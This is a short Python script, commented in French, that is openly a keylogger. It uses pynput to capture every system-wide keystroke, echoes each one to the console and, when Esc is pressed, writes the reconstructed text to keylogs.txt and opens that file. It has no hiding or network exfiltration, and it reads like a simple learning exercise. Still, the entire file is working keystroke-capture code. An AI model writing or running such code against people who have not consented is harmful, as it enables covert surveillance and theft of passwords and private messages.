from pynput import keyboard
import sys
import os

# Nom du fichier de sortie
filename = "keylogs.txt"

key_strokes = []
# fonction de capture des touches
def onPress(key):
    try:
        stroke = key.char  
    except AttributeError:
        stroke = str(key).replace("'", "")  

    print(stroke)   
    key_strokes.append(stroke)  # Ajouter la touche à la liste
# arret d'enregistrement
def onRelease(key):
    if key == keyboard.Key.esc: 
        with open(filename, "w") as file:
            for stroke in key_strokes:
                if stroke == 'Key.space':
                    file.write(" ")
                elif stroke == 'Key.enter':
                    file.write("\n")
                elif stroke == 'Key.backspace':
                    if file.tell() > 0:  # Vérifier qu'il y a des caractères à supprimer
                        file.seek(file.tell() - 1, os.SEEK_SET)
                        file.truncate()
                elif stroke == 'Key.esc':
                    continue
                else:
                    file.write(stroke)
        os.startfile(filename)         
        sys.exit(0)  # Quitter le programme

if __name__ == "__main__":
    with keyboard.Listener(on_press=onPress, on_release=onRelease) as listener:
        listener.join()
